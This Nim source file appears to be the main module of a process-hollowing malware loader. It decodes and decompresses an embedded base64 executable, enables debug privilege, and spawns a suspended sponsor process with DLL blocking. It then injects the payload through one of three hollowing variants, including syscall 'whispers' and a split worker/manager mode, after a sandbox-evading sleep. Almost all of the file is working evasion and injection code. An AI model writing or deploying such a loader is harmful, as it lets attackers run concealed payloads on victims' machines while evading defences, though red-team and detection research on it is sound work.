# Internal
import utils
import params
# External
import os
import winim
import strutils
from std/base64 import decode
from zip/zlib import uncompress

# Import per module chosen
when defined(hollowsimple):
    import hollowsimple
when defined(hollownimline):
    import hollowNimlineWhispers
when defined(hollowsplitted):
    import hollowSplitted


proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), isBlockDlls: bool, sleepSeconds: int = 0): bool =
    
    # Enable debug privilege
    discard setDebugPrivilege()

    # Decode and decompress PE
    var compressedPe = decode(compressedBase64PE)
    var peStr = uncompress(compressedPe)

    # Check hollowsplitted args 
    when defined(hollowsplitted):
        let commandLineParams = commandLineParams()
        for i in commandLineParams:
            if i.startsWith("-A:") or i.startsWith("-W:") or i.startsWith("-T:") or i.startsWith("-R:"):
                # This is a worker process in splitted hollow, let it go
                return splittedNimlineHollowWorker(peStr)
        if not ("-M" in commandLineParams):
            quit(1)

    # Sleep at execution
    sleepUselessCalculations(sleepSeconds)
    
    # Create suspended process with extended attributes (ppid, block dll's)
    var ppi: PPROCESS_INFORMATION = createSuspendedExtendedProcess(sponsorCmd, isBlockDlls)

    # Execute module
    when defined(hollowsimple):
        return simpleHollow(peStr, ppi)
    when defined(hollownimline):
        return nimlineHollow(peStr, ppi)
    when defined(hollowsplitted):
        return splittedNimlineHollowManager(peStr, ppi)


proc main*() =
    discard execute(
        compressedBase64PE = compressedBase64PE, 
        sponsorCmd = sponsorPath & sponsorParams,
        isBlockDlls = isBlockDlls,
        sleepSeconds = sleepSeconds
    )


when isMainModule:
    main()